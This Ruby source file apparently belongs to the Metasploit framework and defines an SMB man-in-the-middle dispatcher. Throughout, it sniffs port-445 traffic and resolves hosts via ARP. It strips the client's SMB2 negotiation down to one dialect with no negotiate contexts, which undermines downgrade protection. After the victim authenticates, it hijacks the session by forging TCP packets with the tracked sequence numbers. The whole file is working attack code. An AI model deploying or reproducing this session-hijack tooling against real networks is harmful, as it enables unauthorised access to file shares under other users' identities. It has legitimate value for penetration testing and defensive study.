module Msf
class Exploit
module SMB
  # This class provides a Man-In-The-Middle packet Dispatcher.
  class MitmDispatcher < RubySMB::Dispatcher::Base
      READ_TIMEOUT = 30
      ARP_DELAY = 1.5

      # The underlying socket that we select on
      # @!attribute [rw] tcp_socket
      #   @return [IO]
      attr_accessor :tcp_socket

      # The read timeout
      # @!attribute [rw] read_timeout
      #   @return [Integer]
      attr_accessor :read_timeout

      # The arp delay
      # @!attribute [rw] arp_delay
      #   @return [Float]
      attr_accessor :arp_delay

      # The mitm interface
      # @!attribute [rw] interface
      #   @return [String]
      attr_accessor :interface

      # The mac address
      # @!attribute [rw] mac
      #   @return [String]
      attr_accessor :mac

      # The destination mac address
      # @!attribute [rw] dstmac
      #   @return [String]
      attr_accessor :dstmac

      # The sequence number
      # @!attribute [rw] seqnum
      #   @return [Integer]
      attr_accessor :seqnum

      # The acknowledgement number
      # @!attribute [rw] acknum
      #   @return [Integer]
      attr_accessor :acknum

      attr_accessor :ip_src

      attr_accessor :ip_dst

      attr_accessor :tcp_src

      attr_accessor :tcp_dst

      attr_accessor :tcp_win

      # Current Capture
      attr_accessor :ccap

      # Wether we are still forwarding packets
      # @!attribute [rw] forwarding
      #   @return [bool]
      attr_accessor :forwarding

      attr_accessor :override_client_instance_variables
      # These are overrides for the client instance variables
      attr_accessor :dialect
      attr_accessor :session_id
      attr_accessor :smb1
      attr_accessor :smb2
      attr_accessor :smb3
      attr_accessor :smb2_message_id
      attr_accessor :server_guid
      attr_accessor :negotiated_smb_version
      attr_accessor :session_encrypt_data

      # We decide the host based on the first person to connect
      def initialize(interface: PacketFu::Utils.default_int, mac: PacketFu::Utils.whoami?(iface: @interface)[:eth_saddr], read_timeout: READ_TIMEOUT, arp_delay: ARP_DELAY)
        @override_client_instance_variables = true
        @interface = interface
        @mac = mac
        @read_timeout = read_timeout
        @arp_delay = arp_delay
        @smb1 = false
        @smb2 = true
        @smb3 = false
        @session_encrypt_data = false
        get_syn
        get_ack
        get_auth
      end

      def get_syn
        cap = PacketFu::Capture.new(
          iface: @interface,
          promisc: false,
          start: true,
          filter: "ether dst #{@mac} and not ether src #{@mac} and dst port 445 and tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) == 0",
          timeout: 0
        )
        pkt = nil
        while pkt.nil?
          raw_pkt = cap.next
          next if raw_pkt.nil?
          pkt = PacketFu::Packet.parse(raw_pkt)
        end
        dstmac = arp(tpa: pkt.ip_header.ip_daddr)
        #puts "Dstmac: #{dstmac.inspect}"
        raise RubySMB::Error::NegotiationFailure, "Unable to resolve dstmac for: #{pkt.ip_header.ip_daddr}" if dstmac == []
        @dstmac = dstmac
        @ip_src = pkt.ip_header.ip_src
        @ip_dst = pkt.ip_header.ip_dst
        @acknum = pkt.tcp_header.tcp_ack
        @seqnum = pkt.tcp_header.tcp_seq
        @tcp_dst = pkt.tcp_header.tcp_dst
        @tcp_src = pkt.tcp_header.tcp_src
        @tcp_win = pkt.tcp_header.tcp_win
        pkt.eth_header.eth_saddr = @mac
        pkt.eth_header.eth_daddr = @dstmac
        @ccap = PacketFu::Capture.new(
          iface: @interface,
          promisc: false,
          start: true,
          filter: "ether dst #{@mac} and not ether src #{@mac} and dst port 445 and tcp[0:2] = #{@tcp_src}",
          timeout: 0
        )
        pkt.to_w(@interface)
      end

      # This sends an arp packet out to the network and captures the response.
      # This allows us to resolve mac addresses in real time.
      # We need the mac address of the server and client.
      def arp(smac: @mac, dmac: 'ff:ff:ff:ff:ff:ff',
              sha: @mac, spa: PacketFu::Utils.default_ip,
              tha: '00:00:00:00:00:00', tpa: '', op: 1,
              capture: true)
        p = PacketFu::ARPPacket.new(
          eth_src: str2mac(smac),
          eth_dst: str2mac(dmac),
          arp_src_mac: str2mac(sha),
          arp_src_ip: str2ip(spa),
          arp_dst_mac: str2mac(tha),
          arp_dst_ip: str2ip(tpa),
          arp_opcode: op
        )
        if capture
          c = PacketFu::Capture.new(iface: @interface)
          c.capture
          c.stream.setfilter("arp src #{tpa} and ether dst #{smac}")
          p.to_w(@interface)
          sleep @arp_delay
          c.save
          c.array.each do |pkt|
            pkt = PacketFu::Packet.parse pkt
            # This decodes the arp packet and returns the query response.
            if pkt.arp_header.arp_src_ip == str2ip(tpa)
              return mac2str(pkt.arp_header.arp_src_mac)
            end
            return ip2str(pkt.arp_header.arp_src_ip) if mac2str(pkt.arp_header.src_mac) == tha
          end
        else
          p.to_w(@interface)
        end
      end

      # This converts a string to a binary mac.
      def str2mac(str)
        [str.split(':').join].pack('H*')
      end

      # This converts a binary mac to a string.
      def mac2str(mac)
        mac.to_s.bytes.map { |s| s.to_s(16).rjust(2, '0') }.join(':')
      end

      # This converts a string to a binary ip.
      def str2ip(str)
        str.split('.').map(&:to_i).pack('C*')
      end

      # This converts a binary ip to a string.
      def ip2str(ip)
        ip.bytes.map(&:to_s).join('.')
      end

      # This converts an integer to a binary ip.
      def int2ip(int)
        [int].pack('N')
      end

      def get_ack
        pkt = nil
        while pkt.nil?
          raw_pkt = @ccap.next
          next if raw_pkt.nil?
          pkt = PacketFu::Packet.parse(raw_pkt)
        end
        @acknum = pkt.tcp_header.tcp_ack
        @seqnum = pkt.tcp_header.tcp_seq
        pkt.eth_header.eth_saddr = @mac
        pkt.eth_header.eth_daddr = @dstmac
        pkt.to_w(@interface)
      end

      def get_auth
        # Negotiate Protocol
        pkt = nil
        while true
          raw_pkt = @ccap.next
          next if raw_pkt.nil?
          pkt = PacketFu::Packet.parse(raw_pkt)
          if pkt.payload.size >= 5
            nss = pkt.payload[0..3]
            smb2 = pkt.payload[4..-1]
            if (smb2[0..4] != "\xFFSMB")
              case smb2[11..12]
              when "\x00\x00" # Negotiate Protocol Request
                smb_packet = RubySMB::SMB2::Packet::NegotiateRequest.read(smb2)
                # Dialect Count Set To 1
                smb_packet.dialect_count = 1
                @negotiated_smb_version = smb_packet.dialects.first
                @dialect = smb_packet.dialects.first
                smb_packet.dialects = [smb_packet.dialects.first]
                smb_packet.negotiate_context_list = []
                smb_packet.client_start_time = 0
                # Re-Calculate Length: (Optional...)
                # nss = [smb_packet.to_binary_s.size].pack("N")
                pkt.payload = "#{nss}#{smb_packet.to_binary_s}"
              when "\x00\x01" # Session Setup Request, NTLMSSP_AUTH
                smb_packet = RubySMB::SMB2::Packet::SessionSetupRequest.read(smb2)
                if smb_packet.smb2_header.session_id != 0
                  @acknum = pkt.tcp_header.tcp_ack
                  @seqnum = pkt.tcp_header.tcp_seq
                  pkt.eth_header.eth_saddr = @mac
                  pkt.eth_header.eth_daddr = @dstmac
                  pkt.recalc
                  @ccap = PacketFu::Capture.new(
                    iface: @interface,
                    promisc: false,
                    start: true,
                    filter: "ether dst #{@mac} and not ether src #{@mac} and src port 445 and tcp[4:4] = #{@acknum}",
                    timeout: 0
                  )
                  pkt.to_w(@interface)
                  break
                end
              end
            end
          end
          pkt.eth_header.eth_saddr = @mac
          pkt.eth_header.eth_daddr = @dstmac
          pkt.recalc
          pkt.to_w(@interface)
        end
        data = recv_packet
        smb_packet = RubySMB::SMB2::Packet::SessionSetupResponse.read(data)
        @session_id = smb_packet.smb2_header.session_id
        @smb2_message_id = smb_packet.smb2_header.message_id + 1
        nil
      end

      # @param host [String] passed to TCPSocket.new
      # @param port [Fixnum] passed to TCPSocket.new
      def self.connect#(host, port: 445, socket: TCPSocket.new(host, port))
        new()
      end

      def send_packet(packet, nbss_header: true)
        data = nbss_header ? nbss(packet) : ''
        data << packet.to_binary_s
        eth_header = PacketFu::EthHeader.new(eth_src: str2mac(@mac), eth_dst: str2mac(@dstmac))
        ip_header = PacketFu::IPHeader.new(ip_src: int2ip(@ip_src), ip_dst: int2ip(@ip_dst))
        tcp_header = PacketFu::TCPHeader.new(
          tcp_src: @tcp_src,
          tcp_dst: @tcp_dst,
          tcp_seq: @seqnum,
          tcp_ack: @acknum,
          tcp_win: @tcp_win,
          tcp_flags: { ack: 1, psh: 1}
        )
        pkt = PacketFu::TCPPacket.new(eth: eth_header, ip: ip_header, tcp: tcp_header)
        pkt.payload = data
        pkt.recalc
        @ccap = PacketFu::Capture.new(
          iface: @interface,
          promisc: false,
          start: true,
          filter: "ether dst #{@mac} and not ether src #{@mac} and src port 445 and tcp[4:4] = #{@acknum}",
          timeout: 0
        )
        pkt.to_w(@interface)
        nil
      end

      # Read a packet off the wire and parse it into a string
      #
      # @param full_response [Boolean] whether to include the NetBios Session Service header in the response
      # @return [String] the raw response (including the NetBios Session Service header if full_response is true)
      # @raise [RubySMB::Error::NetBiosSessionService] if there's an error reading the first 4 bytes,
      #   which are assumed to be the NetBiosSessionService header.
      # @raise [RubySMB::Error::CommunicationError] if the read timeout expires or an error occurs when reading the packet
      def recv_packet(full_response: false)
        raise RubySMB::Error::CommunicationError, 'Capture has not been initialized' unless @ccap.class == PacketFu::Capture
        pkt = nil
        while pkt.nil?
          raw_pkt = @ccap.next
          next if raw_pkt.nil?
          pkt = PacketFu::Packet.parse(raw_pkt)
        end
        @acknum = pkt.tcp_header.tcp_seq + pkt.tcp_header.body.size
        @seqnum = pkt.tcp_header.tcp_ack
        return pkt.payload[(full_response ? 0 : 4)..-1]
      rescue Errno::EINVAL, Errno::ECONNABORTED, Errno::ECONNRESET, TypeError, NoMethodError => e
        raise RubySMB::Error::CommunicationError, "An error occurred reading from the Network #{e.message}"
      end
    end
  end
end
end
